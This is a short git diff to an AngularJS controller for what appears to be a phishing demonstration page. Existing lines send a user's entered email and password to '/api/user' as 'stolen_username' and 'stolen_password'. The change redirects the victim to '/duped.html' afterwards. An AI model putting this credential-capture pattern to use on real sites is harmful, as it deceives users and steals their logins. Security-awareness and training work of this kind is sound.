@@ -1,6 +1,6 @@
 var app = angular.module("app", []);
 
-app.controller("AppCtrl", function($http) {
+app.controller("AppCtrl", function($http, $window) {
     var app = this;
 
     $http.get("/api/user").success(function(data) {
@@ -11,6 +11,7 @@ app.controller("AppCtrl", function($http) {
         $http.post("/api/user", {"stolen_username": app.email, "stolen_password": app.password})
             .success(function(data) {
                 app.entries.push(data);
+                $window.location.href = '/duped.html';
             })
     }
 
